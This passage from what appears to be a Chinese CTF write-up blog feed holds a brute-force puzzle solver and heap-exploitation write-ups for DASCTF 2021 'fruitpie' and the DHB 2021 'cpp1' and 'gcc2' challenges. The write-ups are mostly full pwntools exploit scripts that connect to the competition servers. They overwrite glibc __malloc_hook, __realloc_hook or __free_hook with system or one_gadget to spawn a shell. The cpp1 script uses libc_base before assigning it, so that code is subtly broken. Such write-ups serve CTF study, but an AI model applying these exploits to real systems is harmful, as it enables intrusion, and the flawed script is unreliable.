<span class="keyword">or</span> i4 &gt;= <span class="number">3</span> <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i5 &gt;= i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num3.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i4 != <span class="number">3</span> <span class="keyword">or</span> i4 == <span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num4.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i2 &gt;= i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i3 &lt;= i4 <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i5 == <span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num5.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> num1:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> num2:</span><br><span class="line">        <span class="keyword">if</span> (i1[<span class="number">2</span>] &lt;= i2[<span class="number">2</span>] <span class="keyword">or</span> i1[<span class="number">4</span>] &lt;= i2[<span class="number">4</span>]):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">if</span> (i2[i] == i1[i]):</span><br><span class="line">                    flag = <span class="number">1</span>                                  </span><br><span class="line">            <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i3 <span class="keyword">in</span> num3:</span><br><span class="line">                    flag = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i3[i] == i1[i] <span class="keyword">or</span> i3[i] == i2[i]):</span><br><span class="line">                            flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i4 <span class="keyword">in</span> num4:</span><br><span class="line">                            flag = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i4[i] == i1[i] <span class="keyword">or</span> i4[i] == i2[i] <span class="keyword">or</span> i4[i] == i3[i]):</span><br><span class="line">                                    flag = <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="keyword">for</span> i5 <span class="keyword">in</span> num5:</span><br><span class="line">                                    <span class="keyword">if</span> (i4[<span class="number">1</span>] &gt;= i5[<span class="number">1</span>] <span class="keyword">or</span> i4[<span class="number">4</span>] &gt;= i5[<span class="number">4</span>]):</span><br><span class="line">                                        <span class="keyword">continue</span></span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        flag = <span class="number">0</span></span><br><span class="line">                                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                                            <span class="keyword">if</span> (i5[i] == i1[i] <span class="keyword">or</span> i5[i] == i2[i] <span class="keyword">or</span> i5[i] == i3[i] <span class="keyword">or</span> i5[i] == i4[i]):</span><br><span class="line">                                                flag = <span class="number">1</span></span><br><span class="line">                                        <span class="keyword">if</span> (flag == <span class="number">1</span>):</span><br><span class="line">                                            <span class="keyword">continue</span></span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">&#x27;========================&#x27;</span>)</span><br><span class="line">                                        <span class="built_in">print</span>(i1)</span><br><span class="line">                                        <span class="built_in">print</span>(i2)</span><br><span class="line">                                        <span class="built_in">print</span>(i3)</span><br><span class="line">                                        <span class="built_in">print</span>(i4)</span><br><span class="line">                                        <span class="built_in">print</span>(i5)</span><br><span class="line">                                        <span class="built_in">print</span>(<span class="string">&#x27;========================&#x27;</span>)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p>
<p>fill_number 会检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map</span><br><span class="line">00000</span><br><span class="line">00000</span><br><span class="line">04400</span><br><span class="line">00030</span><br><span class="line">00010</span><br></pre></td></tr></table></figure>

<p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p>
]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>DASCTF_2021_3</title>
    <url>/article/DASCTF_2021_3/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h2><p>保护全开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;fruitpie&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>IDA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  LODWORD(size) = readInt(<span class="string">&quot;Enter the size to malloc:&quot;</span>);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Offset:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v5[*(<span class="keyword">size_t</span> *)((<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>)], <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0xA0</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路</p>
<ul>
<li>获取libc_base：当申请一个足够大的堆时会由mmap分配，此时程序会给我们chunk的地址，而这个地址紧挨着libc并且偏移固定</li>
<li>将one_gadget写到realloc_hook地址中，在malloc_hook的地址写入realloc + x来调整栈帧，x的取值可以有2，4，6，8，9。</li>
</ul>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10018</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./fruitpie&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the size to malloc:&#x27;</span>,<span class="string">&#x27;99999999&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr + <span class="number">0x5f5eff0</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">realloc_hook = malloc_hook - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>] <span class="comment">#0x4f3c2</span></span><br><span class="line"></span><br><span class="line">offset = realloc_hook - addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_hook)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Offset:&#x27;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Data:&#x27;</span>,p64(one_gadget) + p64(realloc+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>DHB东华杯_2021</title>
    <url>/article/DHB_2021/</url>
    <content><![CDATA[<h1 id="DHB东华杯-2021"><a href="#DHB东华杯-2021" class="headerlink" title="DHB东华杯_2021"></a>DHB东华杯_2021</h1><p>这次比赛web才是重点，反而二进制是签到了</p>
<p>三道Pwn和学弟一起做出来的，只能说学弟tql</p>
<p><img src="/article/DHB_2021/image-20211106152021629.png" alt="image-20211106152021629"></p>
<p><img src="/article/DHB_2021/image-20211106152042912.png" alt="image-20211106152042912"></p>
<span id="more"></span>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>这次题目都是 libc-2.31</p>
<h1 id="cpp1"><a href="#cpp1" class="headerlink" title="cpp1"></a>cpp1</h1><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">filename = <span class="string">&#x27;pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;47.104.143.202&#x27;</span>,<span class="number">43359</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;S:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;V:&gt;&gt;&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">1104</span> -<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook_addr: &#x27;</span> + <span class="built_in">hex</span>(malloc_hook_addr))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe6c7e</span>,<span class="number">0xe6c81</span>,<span class="number">0xe6c84</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line">libc_base = malloc_hook_addr - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base +libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="string">&#x27;one_gadget: &#x27;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x91</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="gcc2"><a href="#gcc2" class="headerlink" title="gcc2"></a>gcc2</h1><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line">filename = <span class="string">&#x27;pwn2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;47.104.143.202 &#x27;</span>, <span class="number">15348</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;S:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;V:&gt;&gt;&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;I:&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena_offset = libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x67</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x67</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x67</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x12ec0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x67</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x67</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x0007000000000000</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">base = u64(p.recvline(keepends=<span class="literal">False</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-main_arena_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">free_hook=base +libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=base +libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x0000000000000000</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x67</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x67</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(sys))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



